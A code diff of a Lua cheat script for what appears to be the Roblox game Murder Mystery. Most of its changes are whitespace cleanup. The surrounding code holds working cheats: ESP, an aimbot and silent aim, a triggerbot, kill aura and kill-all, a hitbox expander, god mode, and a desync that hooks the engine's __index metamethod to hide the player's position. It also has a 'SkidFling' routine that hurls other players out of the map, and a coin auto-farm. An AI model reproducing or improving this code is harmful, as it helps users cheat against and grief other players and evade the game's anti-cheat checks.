@@ -1445,7 +1459,7 @@ local function highlightDroppedGun()
         bill.StudsOffset = Vector3.new(0, 3, 0)
         bill.AlwaysOnTop = true
         bill.Parent = gunDrop
-        
+       
         local txt = Instance.new("TextLabel")
         txt.Size = UDim2.new(1,0,1,0)
         txt.BackgroundTransparency = 1
@@ -1462,16 +1476,16 @@ local function updateGunTracer()
         if CurrentGunTracer then CurrentGunTracer:Destroy() CurrentGunTracer = nil end
         return
     end
-    
+   
     local character = LocalPlayer.Character
     if not character or not character:FindFirstChild("HumanoidRootPart") then
         if CurrentGunTracer then CurrentGunTracer:Destroy() CurrentGunTracer = nil end
         return
     end
-    
+   
     local currentMap = getCurrentMap()
     local gunDrop = (currentMap and currentMap:FindFirstChild("GunDrop")) or Workspace:FindFirstChild("GunDrop")
-    
+   
     if gunDrop and gunDrop:IsA("BasePart") then
         if CurrentGunTracer and CurrentGunTracer.Parent then
             if CurrentGunTracer.Attachment1.Parent ~= gunDrop then
@@ -1479,15 +1493,15 @@ local function updateGunTracer()
             end
         else
             if CurrentGunTracer then CurrentGunTracer:Destroy() end
-            
+           
             local att0 = Instance.new("Attachment")
             att0.Name = "TracerAtt0"
             att0.Parent = character.HumanoidRootPart
-            
+           
             local att1 = Instance.new("Attachment")
             att1.Name = "TracerAtt1"
             att1.Parent = gunDrop
-            
+           
             local beam = Instance.new("Beam")
             beam.Name = "GunDropTracer"
             beam.Attachment0 = att0
@@ -1516,7 +1530,7 @@ local function ApplyHitboxExpander(Character)
         HRP.Size = newSize
         HRP.Transparency = 1
         HRP.CanCollide = false
-        
+       
         if not BoxHandles[Character] then
             local box = Instance.new("BoxHandleAdornment")
             box.Adornee = HRP
@@ -1558,16 +1572,15 @@ local function ResetHitboxes()
 end
 
 local antiFlingConnection = nil
-
 local function setupAntiFling()
     if antiFlingConnection then
         antiFlingConnection:Disconnect()
         antiFlingConnection = nil
     end
-    
+   
     antiFlingConnection = RunService.Stepped:Connect(function()
         if not State.AntiFling.Enabled then return end
-        
+       
         for _, player in pairs(Players:GetPlayers()) do
             if player ~= LocalPlayer and player.Character then
                 for _, part in pairs(player.Character:GetDescendants()) do
@@ -1578,7 +1591,7 @@ local function setupAntiFling()
             end
         end
     end)
-    
+   
     Notifier.new({
         Title = "Anti-Fling",
         Content = "Anti-Fling activated",
@@ -1620,7 +1633,7 @@ end
 
 local function enableGodMode()
     if not State.GodMode.Enabled then return end
-    
+   
     local character = LocalPlayer.Character
     if character and character:FindFirstChild("Humanoid") then
         local humanoid = character.Humanoid
@@ -1668,10 +1681,10 @@ end
 local function tpLobby()
     local char = LocalPlayer.Character
     if not char then Notifier.new({Title="Error", Content="Character not loaded", Duration=3}) return end
-    
+   
     local hrp = char:FindFirstChild("HumanoidRootPart")
     if not hrp then Notifier.new({Title="Error", Content="No HumanoidRootPart", Duration=3}) return end
-    
+   
     local lobby = findLobby()
     if lobby then
         local spawnPoint = getSpawnPoint(lobby)
@@ -1681,14 +1694,14 @@ local function tpLobby()
             return
         end
     end
-    
+   
     local fallbackSpots = {
         CFrame.new(-90.5, 20.5, -9.5),
         CFrame.new(-94, 20.5, -12),
         CFrame.new(-87, 20.5, -7),
         CFrame.new(-100, 25, 0)
     }
-    
+   
     for i, cf in ipairs(fallbackSpots) do
         hrp.CFrame = cf
         task.wait(0.1)
@@ -1702,10 +1715,10 @@ end
 local function tpMap()
     local char = LocalPlayer.Character
     if not char then Notifier.new({Title="Error", Content="Character not loaded", Duration=3}) return end
-    
+   
     local hrp = char:FindFirstChild("HumanoidRootPart")
     if not hrp then Notifier.new({Title="Error", Content="No HumanoidRootPart", Duration=3}) return end
-    
+   
     local map = getCurrentMap()
     if map then
         local spawnPoint = getSpawnPoint(map)
@@ -1743,29 +1756,29 @@ local function TeleportToGunSnapBack()
         Notifier.new({Title="Auto TP Skipped", Content="You're the murderer - keeping your knife!", Duration=2})
         return
     end
-    
+   
     local currentMap = getCurrentMap()
     local gunDrop = Workspace:FindFirstChild("GunDrop")
     if currentMap and not gunDrop then gunDrop = currentMap:FindFirstChild("GunDrop") end
-    
+   
     if not gunDrop then
         Notifier.new({Title="Gun TP", Content="No Gun Dropped", Duration=2.5})
         return
     end
-    
+   
     local char = LocalPlayer.Character
     if not char or not char:FindFirstChild("HumanoidRootPart") then return end
-    
+   
     State.Teleport.LastGunPos = char.HumanoidRootPart.CFrame
     Notifier.new({Title="Gun TP", Content="Snapping to gun...", Duration=1.5})
-    
+   
     task.spawn(function()
         local timeout = tick()
         while (tick() - timeout) < 2 and gunDrop and gunDrop.Parent do
             char.HumanoidRootPart.CFrame = gunDrop.CFrame
             RunService.Stepped:Wait()
         end
-        
+       
         if State.Teleport.LastGunPos and char and char:FindFirstChild("HumanoidRootPart") then
             char.HumanoidRootPart.CFrame = State.Teleport.LastGunPos
             State.Teleport.LastGunPos = nil
@@ -1779,13 +1792,13 @@ local function startTriggerbot()
     if triggerConn then triggerConn:Disconnect() end
     triggerConn = RunService.RenderStepped:Connect(function()
         if not State.Triggerbot.Enabled or not hasGun() then return end
-        
+       
         local targetPart = mouse.Target
         if not targetPart then return end
-        
+       
         local char = targetPart:FindFirstAncestorWhichIsA("Model")
         if not char then return end
-        
+       
         local targetPlr = Players:GetPlayerFromCharacter(char)
         if targetPlr and targetPlr ~= LocalPlayer and isMurderer(targetPlr) then
             local gun = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Gun")
@@ -1797,14 +1810,14 @@ end
 local lastAttack = tick()
 RunService.Heartbeat:Connect(function()
     if not State.KillAura.Enabled then return end
-    
+   
     local character = LocalPlayer.Character
     if not character or not character:FindFirstChild("HumanoidRootPart") then return end
-    
+   
     local Knife = (LocalPlayer.Backpack and LocalPlayer.Backpack:FindFirstChild("Knife")) or character:FindFirstChild("Knife")
     if not Knife or not Knife:FindFirstChild("Handle") then return end
     if (tick() - lastAttack) < 0.1 then return end
-    
+   
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr ~= LocalPlayer and isAlive(plr) then
             local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
@@ -1825,20 +1838,20 @@ RunService.Heartbeat:Connect(function()
 end)
 
 local function PerformKillAll()
-    if not State.KillAura.Enabled then 
+    if not State.KillAura.Enabled then
         Notifier.new({Title="Kill All", Content="Enable Kill Aura first", Duration=3})
-        return 
+        return
     end
-    
+   
     local character = LocalPlayer.Character
     if not character then return end
-    
+   
     local Knife = (LocalPlayer.Backpack and LocalPlayer.Backpack:FindFirstChild("Knife")) or character:FindFirstChild("Knife")
     if not Knife then
         Notifier.new({Title="Kill All", Content="No Knife (must be Murderer)", Duration=3})
         return
     end
-    
+   
     if Knife.Parent == LocalPlayer.Backpack then
         character.Humanoid:EquipTool(Knife)
         task.wait(0.25)
@@ -1847,7 +1860,7 @@ local function PerformKillAll()
             task.wait(0.1)
         end
     end
-    
+   
     local count = 0
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr ~= LocalPlayer and isAlive(plr) then
@@ -1869,7 +1882,7 @@ local originalGetTarget = nil
 
 local function getMurdererTargetPosition()
     local targetMurderer = nil
-    
+   
     if State.SilentHacker.Enabled and State.SilentHacker.isDesyncing and State.SilentHacker.currentTarget then
         targetMurderer = State.SilentHacker.currentTarget
     else
@@ -1880,23 +1893,23 @@ local function getMurdererTargetPosition()
             end
         end
     end
-    
+   
     if not targetMurderer or not targetMurderer.Character then
         return nil
     end
-    
+   
     local character = targetMurderer.Character
     local isJumping = isPlayerJumping(character)
     local targetPart
-    
+   
     if isJumping then
         targetPart = character:FindFirstChild("HumanoidRootPart")
     else
         targetPart = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
     end
-    
+   
     if not targetPart then return nil end
-    
+   
     return predictPlayerPosition(targetMurderer, targetPart)
 end
 
@@ -1917,7 +1930,6 @@ local function setupSilentAim()
         Notifier.new({Title="Silent Aim Ready", Content="Integrated with Silent Hacker", Duration=2})
     end
 end
-
 setupSilentAim()
 
 game:GetService("ReplicatedStorage").ChildAdded:Connect(function(child)
@@ -1930,7 +1942,6 @@ end)
 local HoldingMouse2 = false
 local LockedTarget = nil
 local LastLockedTarget = nil
-
 local AimbotToggle = nil
 local DesyncToggle = nil
 
@@ -1945,31 +1956,31 @@ end
 
 local function getBestTarget()
     if not State.Aimbot.featureEnabled or not State.Aimbot.active then return nil end
-    
+   
     if State.Aimbot.Sticky and LockedTarget and isAlive(LockedTarget) then return LockedTarget end
-    
+   
     local camera = Workspace.CurrentCamera
     local mousePos = UserInputService:GetMouseLocation()
     local bestTarget, bestScore = nil, math.huge
-    
+   
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr ~= LocalPlayer and isAlive(plr) and plr.Character then
             if State.Aimbot.OnlyMurderer and not isMurderer(plr) then continue end
-            
+           
             local isJumping = isPlayerJumping(plr.Character)
             local targetPart
-            
+           
             if isJumping then
                 targetPart = plr.Character:FindFirstChild("HumanoidRootPart")
             else
                 targetPart = plr.Character:FindFirstChild("UpperTorso") or plr.Character:FindFirstChild("Torso")
             end
-            
+           
             if not targetPart then targetPart = plr.Character:FindFirstChild("Head") end
-            
+           
             if targetPart then
                 local screenPos, onScreen = camera:WorldToViewportPoint(targetPart.Position)
-                
+               
                 if onScreen then
                     local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                     if dist < State.Aimbot.FOV then
@@ -1984,39 +1995,39 @@ local function getBestTarget()
             end
         end
     end
-    
+   
     if State.Aimbot.Sticky and bestTarget then LockedTarget = bestTarget end
     return bestTarget
 end
 
 local function updateAimbot()
     if not State.Aimbot.featureEnabled or not State.Aimbot.active or not HoldingMouse2 then return end
-    
+   
     local targetPlr = getBestTarget()
     if not targetPlr or not targetPlr.Character then return end
-    
+   
     local isJumping = isPlayerJumping(targetPlr.Character)
     local targetPart
-    
+   
     if isJumping then
         targetPart = targetPlr.Character:FindFirstChild("HumanoidRootPart")
     else
         targetPart = targetPlr.Character:FindFirstChild("UpperTorso") or targetPlr.Character:FindFirstChild("Torso")
     end
-    
+   
     if not targetPart then targetPart = targetPlr.Character:FindFirstChild("HumanoidRootPart") end
-    
+   
     if not targetPart then return end
-    
+   
     local predictedPos = predictPlayerPositionAdvanced(targetPlr, targetPart)
-    
+   
     local camera = Workspace.CurrentCamera
     local currentCFrame = camera.CFrame
     local targetCFrame = CFrame.new(currentCFrame.Position, predictedPos)
-    
+   
     local smooth = isMurderer(targetPlr) and 0.78 or State.Aimbot.Smoothness
     camera.CFrame = currentCFrame:Lerp(targetCFrame, smooth)
-    
+   
     if targetPlr ~= LastLockedTarget then
         LastLockedTarget = targetPlr
         local strafeInfo = ""
@@ -2029,11 +2040,11 @@ end
 
 local function getFlickTarget()
     if not State.FlickShoot.Enabled then return nil end
-    
+   
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr ~= LocalPlayer and isAlive(plr) then
             if State.FlickShoot.OnlyMurderer and not isMurderer(plr) then continue end
-            
+           
             local character = plr.Character
             if character then
                 return plr
@@ -2049,49 +2060,49 @@ local function performFlickShoot()
         Notifier.new({Title="Flick Shoot", Content="No target found", Duration=2})
         return
     end
-    
+   
     local character = LocalPlayer.Character
     if not character then return end
-    
+   
     local gun = character:FindFirstChild("Gun") or character:FindFirstChild("Revolver")
     if not gun then
         Notifier.new({Title="Flick Shoot", Content="No gun equipped", Duration=2})
         return
     end
-    
+   
     local isJumping = isPlayerJumping(targetPlr.Character)
     local targetPart
-    
+   
     if isJumping then
         targetPart = targetPlr.Character:FindFirstChild("HumanoidRootPart")
     else
         targetPart = targetPlr.Character:FindFirstChild("UpperTorso") or targetPlr.Character:FindFirstChild("Torso")
     end
-    
+   
     if not targetPart then targetPart = targetPlr.Character:FindFirstChild("HumanoidRootPart") end
-    
+   
     if not targetPart then return end
-    
+   
     local targetPos = predictPlayerPositionAdvanced(targetPlr, targetPart)
-    
+   
     local camera = Workspace.CurrentCamera
     local startCFrame = camera.CFrame
     local targetCFrame = CFrame.new(camera.CFrame.Position, targetPos)
-    
+   
     local startTime = tick()
     local duration = 0.12
-    
+   
     while (tick() - startTime) < duration do
         local progress = (tick() - startTime) / duration
         camera.CFrame = startCFrame:Lerp(targetCFrame, progress)
         RunService.RenderStepped:Wait()
     end
-    
+   
     camera.CFrame = targetCFrame
     task.wait(0.05)
-    
+   
     gun:Activate()
-    
+   
     Notifier.new({Title="Flick Shoot", Content="Shot "..targetPlr.Name, Duration=2})
 end
 
@@ -2110,34 +2121,34 @@ local function predictMurdererPosSH(murderer)
     if not murderer or not murderer.Character then
         return nil
     end
-    
+   
     local hrp = murderer.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return nil end
-    
+   
     updateNetworkMetrics()
-    
+   
     local targetPos = hrp.Position
     local velocity = hrp.AssemblyLinearVelocity or hrp.Velocity or Vector3.new()
-    
+   
     local predictionTime = (NetworkMetrics.ping / 1000) + 0.085
     predictionTime = math.clamp(predictionTime, 0.03, 0.2)
-    
+   
     local predictedPos = targetPos + (velocity * predictionTime)
-    
+   
     if velocity.Y ~= 0 then
         local gravity = Workspace.Gravity
-        local verticalPos = targetPos.Y + (velocity.Y * predictionTime) - 
+        local verticalPos = targetPos.Y + (velocity.Y * predictionTime) -
                            (0.5 * gravity * predictionTime * predictionTime)
         predictedPos = Vector3.new(predictedPos.X, verticalPos, predictedPos.Z)
     end
-    
+   
     return predictedPos
 end
 
 local function stopSilentHacker()
     State.SilentHacker.isDesyncing = false
     State.SilentHacker.currentTarget = nil
-    
+   
     if State.SilentHacker.currentDesyncCoroutine then
         pcall(function()
             if coroutine.status(State.SilentHacker.currentDesyncCoroutine) ~= "dead" then
@@ -2146,44 +2157,44 @@ local function stopSilentHacker()
         end)
         State.SilentHacker.currentDesyncCoroutine = nil
     end
-    
+   
     Notifier.new({Title="Silent Hacker", Content="Deactivated", Duration=1.5})
 end
 
 local function performSilentHacker()
-    if State.SilentHacker.isDesyncing then 
-        return 
+    if State.SilentHacker.isDesyncing then
+        return
     end
-    
+   
     if not State.SilentHacker.Enabled then return end
-    if not silentAimEnabled then 
+    if not silentAimEnabled then
         Notifier.new({Title="Silent Hacker", Content="Enable Silent Aim first!", Duration=2})
         return
     end
-    
+   
     local character = LocalPlayer.Character
     if not character then return end
-    
+   
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     if not humanoid or humanoid.Health <= 0 then return end
-    
+   
     local rootPart = character:FindFirstChild("HumanoidRootPart")
     if not rootPart then return end
-    
+   
     local murderer = findMurdererSilentHacker()
-    if not murderer then 
-        return 
+    if not murderer then
+        return
     end
-    
+   
     State.SilentHacker.currentTarget = murderer
-    
+   
     local predictedPos = predictMurdererPosSH(murderer)
     if not predictedPos then return end
-    
+   
     State.SilentHacker.isDesyncing = true
-    
+   
     Notifier.new({Title="Silent Hacker ACTIVE", Content="Behind "..murderer.Name.." - AUTO SHOOTING!", Duration=3})
-    
+   
     if State.SilentHacker.currentDesyncCoroutine then
         pcall(function()
             if coroutine.status(State.SilentHacker.currentDesyncCoroutine) ~= "dead" then
@@ -2191,83 +2202,82 @@ local function performSilentHacker()
             end
         end)
     end
-    
+   
     State.SilentHacker.currentDesyncCoroutine = task.spawn(function()
         local startTime = tick()
         local timeRemaining = State.SilentHacker.Duration
-        
+       
         while timeRemaining > 0 and State.SilentHacker.isDesyncing do
             timeRemaining = State.SilentHacker.Duration - (tick() - startTime)
-            
+           
             if not rootPart or not rootPart.Parent then
                 stopSilentHacker()
                 return
             end
-            
+           
             murderer = findMurdererSilentHacker()
             if not murderer or not isAlive(murderer) then
                 stopSilentHacker()
                 return
             end
-            
+           
             State.SilentHacker.currentTarget = murderer
-            
+           
             local newPredictedPos = predictMurdererPosSH(murderer)
             if not newPredictedPos then
                 task.wait(0.016)
                 continue
             end
-            
+           
             predictedPos = newPredictedPos
-            
+           
             local murdererHRP = murderer.Character:FindFirstChild("HumanoidRootPart")
             if not murdererHRP then
                 task.wait(0.016)
                 continue
             end
-            
+           
             local murdererLookVector = murdererHRP.CFrame.LookVector
             local behindPosition = predictedPos - (murdererLookVector * State.SilentHacker.BehindDistance)
             behindPosition = Vector3.new(behindPosition.X, predictedPos.Y, behindPosition.Z)
-            
+           
             local behindCFrame = CFrame.lookAt(behindPosition, predictedPos)
-            
+           
             local clientVisualPosition = rootPart.CFrame
-            
+           
             rootPart.CFrame = behindCFrame
-            
+           
             RunService.Heartbeat:Wait()
-            
+           
             if rootPart and rootPart.Parent then
                 rootPart.CFrame = clientVisualPosition
             end
-            
+           
             task.wait(0.016)
         end
-        
+       
         stopSilentHacker()
     end)
-    
+   
     return murderer.Name
 end
 
 local gunHookConnected = false
-
 local function setupSilentHackerGunHook()
     if gunHookConnected then return end
     gunHookConnected = true
-    
+   
     local function hookGunActivate(gun)
         if not gun or not gun:IsA("Tool") then return end
         if not (gun.Name == "Gun" or gun.Name == "Revolver") then return end
-        
+       
         gun.Activated:Connect(function()
             if State.SilentHacker.Enabled and silentAimEnabled then
                 pcall(performSilentHacker)
             end
         end)
     end
-    
+   
     local char = LocalPlayer.Character
     if char then
         for _, item in ipairs(char:GetChildren()) do
@@ -2275,14 +2285,14 @@ local function setupSilentHackerGunHook()
                 hookGunActivate(item)
             end
         end
-        
+       
         char.ChildAdded:Connect(function(child)
             if child:IsA("Tool") then
                 hookGunActivate(child)
             end
         end)
     end
-    
+   
     LocalPlayer.CharacterAdded:Connect(function(newChar)
         task.wait(0.5)
         for _, item in ipairs(newChar:GetChildren()) do
@@ -2290,7 +2300,7 @@ local function setupSilentHackerGunHook()
                 hookGunActivate(item)
             end
         end
-        
+       
         newChar.ChildAdded:Connect(function(child)
             if child:IsA("Tool") then
                 hookGunActivate(child)
@@ -2298,12 +2308,11 @@ local function setupSilentHackerGunHook()
         end)
     end)
 end
-
 setupSilentHackerGunHook()
 
 UserInputService.InputBegan:Connect(function(input, gp)
     if gp then return end
-    
+   
     if input.UserInputType == Enum.UserInputType.MouseButton2 then
         HoldingMouse2 = State.Aimbot.featureEnabled and State.Aimbot.active
     elseif input.KeyCode == StringToKeyCode(State.Hitbox.VisualizerKeybind) then
@@ -2373,17 +2382,17 @@ end)
 
 local function LocalTriggerDesyncOnce()
     if not State.Desync.featureEnabled then return end
-    
+   
     local LocalCharacter = LocalPlayer.Character
     local LocalRootPart = LocalCharacter and LocalCharacter:FindFirstChild("HumanoidRootPart")
     if not LocalRootPart then return end
-    
+   
     DesyncData.OriginalCFrame = LocalRootPart.CFrame
     DesyncData.StartTime = tick()
-    
+   
     local MethodToCall = DesyncMethods[getgenv().Desync.Method]
     if MethodToCall then MethodToCall(LocalRootPart) end
-    
+   
     getgenv().Desync.LastTriggered = tick()
 end
 
@@ -2392,15 +2401,15 @@ if getgenv().Desync then getgenv().Desync.TriggerOnce = LocalTriggerDesyncOnce e
 local function checkHealthForDesync()
     local character = LocalPlayer.Character
     if not character then return end
-    
+   
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     if not humanoid then return end
-    
+   
     local currentHealth = humanoid.Health
     local maxHealth = humanoid.MaxHealth
     local healthPercent = (currentHealth / maxHealth) * 100
     local desync = getgenv().Desync
-    
+   
     if desync.AutoDesyncOnDamage and healthPercent < desync.HealthThreshold and
        desync.LastHealth > healthPercent and
        (tick() - desync.LastTriggered) > desync.Cooldown then
@@ -2413,10 +2422,10 @@ end
 local function getNearestMurdererDistance()
     local character = LocalPlayer.Character
     if not character then return nil end
-    
+   
     local hrp = character:FindFirstChild("HumanoidRootPart")
     if not hrp then return nil end
-    
+   
     local nearestDistance = math.huge
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr ~= LocalPlayer and isAlive(plr) and isMurderer(plr) then
@@ -2445,9 +2454,9 @@ local function checkAutoAvoidMurderer()
         end
         return
     end
-    
+   
     local nearestMurdererDist = getNearestMurdererDistance()
-    
+   
     if nearestMurdererDist and nearestMurdererDist <= desync.AvoidDistance then
         if not desync.Enabled and State.Desync.featureEnabled then
             desync.AutoAvoidActive = true
@@ -2466,13 +2475,13 @@ local function checkAutoAvoidMurderer()
     end
 end
 
-SetAimbotToggle = function(value) 
+SetAimbotToggle = function(value)
     if AimbotToggle and AimbotToggle.Set then
         AimbotToggle:Set(value)
     end
 end
 
-SetDesyncToggle = function(value) 
+SetDesyncToggle = function(value)
     if DesyncToggle and DesyncToggle.Set then
         DesyncToggle:Set(value)
     end
@@ -2480,16 +2489,15 @@ end
 
 local function SkidFling(TargetPlayer, callback)
     if State.Fling.isActive and State.Fling.currentTarget then return end
-    
+   
     State.Fling.isActive = true
     State.Fling.currentTarget = TargetPlayer
-    
+   
     local Character = LocalPlayer.Character
     local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
     local RootPart = Humanoid and Humanoid.RootPart
     local TCharacter = TargetPlayer.Character
     local THumanoid, TRootPart, THead, Accessory, Handle
-
     if not Character or not Humanoid or not RootPart then
         Notifier.new({Title="Fling Error", Content="Your character not loaded", Duration=3})
         State.Fling.isActive = false
@@ -2497,7 +2505,6 @@ local function SkidFling(TargetPlayer, callback)
         if callback then callback() end
         return
     end
-
     if TCharacter then
         THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
         if THumanoid and THumanoid.RootPart then TRootPart = THumanoid.RootPart end
@@ -2505,7 +2512,6 @@ local function SkidFling(TargetPlayer, callback)
         Accessory = TCharacter:FindFirstChildOfClass("Accessory")
         if Accessory and Accessory:FindFirstChild("Handle") then Handle = Accessory.Handle end
     end
-
     if not (TCharacter and THumanoid) then
         Notifier.new({Title="Fling Error", Content="Target not loaded", Duration=3})
         State.Fling.isActive = false
@@ -2513,7 +2519,6 @@ local function SkidFling(TargetPlayer, callback)
         if callback then callback() end
         return
     end
-
     if THumanoid.Sit then
         Notifier.new({Title="Fling Error", Content="Target is sitting", Duration=3})
         State.Fling.isActive = false
@@ -2521,9 +2526,7 @@ local function SkidFling(TargetPlayer, callback)
         if callback then callback() end
         return
     end
-
     getgenv().OldPos = RootPart.CFrame
-
     if THead then
         workspace.CurrentCamera.CameraSubject = THead
     elseif Handle then
@@ -2531,19 +2534,15 @@ local function SkidFling(TargetPlayer, callback)
     elseif THumanoid and TRootPart then
         workspace.CurrentCamera.CameraSubject = THumanoid
     end
-
     local oldAntiFling = State.AntiFling.Enabled
     State.AntiFling.Enabled = false
     workspace.FallenPartsDestroyHeight = 0/0
-
     local BV = Instance.new("BodyVelocity")
     BV.Name = "EpixVel"
     BV.Parent = RootPart
     BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
     BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
-
     Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-
     local targetPart = THead or TRootPart or Handle or TRootPart
     if not targetPart then
         Notifier.new({Title="Fling Error", Content="Target has no flingable parts", Duration=3})
@@ -2553,21 +2552,17 @@ local function SkidFling(TargetPlayer, callback)
         if callback then callback() end
         return
     end
-
     local function FPos(BasePart, Pos, Ang)
         RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
         Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
         RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
         RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
     end
-
     local function SFBasePart(BasePart)
         local TimeToWait = 3
         local Time = tick()
         local Angle = 0
-
         Notifier.new({Title="Fling Started", Content="Flinging "..TargetPlayer.Name, Duration=2})
-
         repeat
             if RootPart and THumanoid then
                 if BasePart.Velocity.Magnitude < 50 then
@@ -2611,7 +2606,6 @@ local function SkidFling(TargetPlayer, callback)
             end
         until BasePart.Velocity.Magnitude > 500 or not BasePart.Parent or TargetPlayer.Parent ~= Players or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
     end
-
     if TRootPart and THead then
         if (TRootPart.Position - THead.Position).Magnitude > 5 then
             SFBasePart(THead)
@@ -2625,13 +2619,11 @@ local function SkidFling(TargetPlayer, callback)
     elseif Handle then
         SFBasePart(Handle)
     end
-
     pcall(BV.Destroy, BV)
     Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
     workspace.CurrentCamera.CameraSubject = Humanoid
     State.AntiFling.Enabled = oldAntiFling
     workspace.FallenPartsDestroyHeight = getgenv().FPDH
-
     local returnStart = tick()
     repeat
         pcall(function()
@@ -2647,7 +2639,6 @@ local function SkidFling(TargetPlayer, callback)
         end)
         task.wait(0.1)
     until (RootPart.Position - getgenv().OldPos.Position).Magnitude < 25 or tick() - returnStart > 2
-
     Notifier.new({Title="Fling Success", Content="Successfully flung "..TargetPlayer.Name, Duration=3})
     State.Fling.isActive = false
     State.Fling.currentTarget = nil
@@ -2751,7 +2742,7 @@ local OriginalCFrameHook = nil
 OriginalCFrameHook = hookmetamethod(game, "__index", newcclosure(function(Self, Key)
     if State.Desync.featureEnabled and State.Desync.active and getgenv().Desync.Enabled then
         if not checkcaller() then
-            if Key == "CFrame" and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and 
+            if Key == "CFrame" and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and
                LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.Health > 0 then
                 if Self == LocalPlayer.Character.HumanoidRootPart or Self == LocalPlayer.Character.Head then
                     return DesyncData.OriginalCFrame or CFrame.new()
@@ -2811,7 +2802,7 @@ end
 local function highlightCoin(coin)
     if not coin or not coin:IsA("BasePart") then return end
     if AutoFarm.coinHighlights[coin] then return end
-    
+   
     local hl = Instance.new("Highlight")
     hl.Name = "AutoFarmCoinHighlight"
     hl.Adornee = coin
@@ -2834,7 +2825,7 @@ local function refreshCoinESP()
         clearCoinHighlights()
         return
     end
-    
+   
     for _, obj in ipairs(workspace:GetDescendants()) do
         if isCoin(obj) then
             highlightCoin(obj)
@@ -2846,7 +2837,7 @@ local function desyncCollect(targetPos)
     local character = LocalPlayer.Character
     local rootPart = character and character:FindFirstChild("HumanoidRootPart")
     if not rootPart then return false end
-    
+   
     local originalPos = rootPart.CFrame
     rootPart.CFrame = CFrame.new(targetPos.X, targetPos.Y + 2, targetPos.Z)
     task.wait(0.15)
@@ -2858,7 +2849,7 @@ local function tweenCollect(targetPos)
     local character = LocalPlayer.Character
     local rootPart = character and character:FindFirstChild("HumanoidRootPart")
     if not rootPart then return false end
-    
+   
     local targetCFrame = CFrame.new(targetPos.X, targetPos.Y + 2, targetPos.Z)
     local tweenInfo = TweenInfo.new(State.AutoFarm.TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
     local tween = TweenService:Create(rootPart, tweenInfo, {CFrame = targetCFrame})
@@ -2872,10 +2863,10 @@ local function startAutoFarm()
     if AutoFarm.isCollecting then return end
     AutoFarm.isCollecting = true
     AutoFarm.isWaitingForNewCoins = false
-    
+   
     while State.AutoFarm.Enabled do
         local allCoins = scanForCoins()
-        
+       
         if #allCoins == 0 then
             if not AutoFarm.isWaitingForNewCoins then
                 AutoFarm.isWaitingForNewCoins = true
@@ -2883,22 +2874,22 @@ local function startAutoFarm()
             task.wait(1)
         else
             AutoFarm.isWaitingForNewCoins = false
-            
+           
             local character = LocalPlayer.Character
             local rootPart = character and character:FindFirstChild("HumanoidRootPart")
-            
+           
             if not rootPart then
                 task.wait(0.5)
             else
                 local sortedCoins = sortCoinsByDistance(allCoins, rootPart.Position)
-                
+               
                 for i, coin in ipairs(sortedCoins) do
                     if not State.AutoFarm.Enabled then break end
-                    
+                   
                     if not coin.part or not coin.part.Parent then
                         break
                     end
-                    
+                   
                     if coin.part then
                         local tempHighlight = Instance.new("Highlight")
                         tempHighlight.Adornee = coin.part
@@ -2907,28 +2898,28 @@ local function startAutoFarm()
                         tempHighlight.Parent = coin.part
                         task.delay(0.3, function() pcall(function() tempHighlight:Destroy() end) end)
                     end
-                    
+                   
                     if State.AutoFarm.Mode == "DESYNC" then
                         desyncCollect(coin.position)
                         task.wait(1.5)
                     else
                         tweenCollect(coin.position)
                     end
-                    
+                   
                     refreshCoinESP()
                 end
-                
+               
                 task.wait(0.3)
             end
         end
     end
-    
+   
     AutoFarm.isCollecting = false
 end
 
 local function toggleAutoFarm()
     State.AutoFarm.Enabled = not State.AutoFarm.Enabled
-    
+   
     if State.AutoFarm.Enabled then
         refreshCoinESP()
         task.spawn(startAutoFarm)
@@ -2978,9 +2969,9 @@ local PingDisplay = Watermark:AddText({ Icon = "wifi", Text = "PING: 0ms" });
 Watermark:AddText({ Icon = "server", Text = Compkiller.Version });
 
 task.spawn(function()
-    while task.wait(0.5) do 
+    while task.wait(0.5) do
         Time:SetText(Compkiller:GetTimeNow())
-        PingDisplay:SetText(string.format("PING: %dms | VAR: %dms | STD: %.1f | STAB: %.1f%%", 
+        PingDisplay:SetText(string.format("PING: %dms | VAR: %dms | STD: %.1f | STAB: %.1f%%",
             NetworkMetrics.ping, NetworkMetrics.variance, NetworkMetrics.standardDeviation, NetworkMetrics.stability * 100))
     end
 end)
@@ -2992,12 +2983,9 @@ Notifier.new({
     Icon = "rbxassetid://120245531583106"
 });
 
--- UI Categories and Tabs
 Window:DrawCategory({ Name = "Main Features" })
-
 local VisualsTab = Window:DrawTab({ Name = "Visuals", Icon = "paintbrush", EnableScrolling = true })
 local VisualsPlayerSection = VisualsTab:DrawSection({ Name = "Player ESP", Position = 'left' })
-
 VisualsPlayerSection:AddToggle({
     Name = "Enable Player Highlight",
     Flag = "ESP_Enabled",
@@ -3007,14 +2995,12 @@ VisualsPlayerSection:AddToggle({
         if v then ForceRefreshESP() else destroyAllPlayerHighlights() end
     end,
 })
-
 VisualsPlayerSection:AddToggle({
     Name = "Enable Name Tags",
     Flag = "NameESP_Enabled",
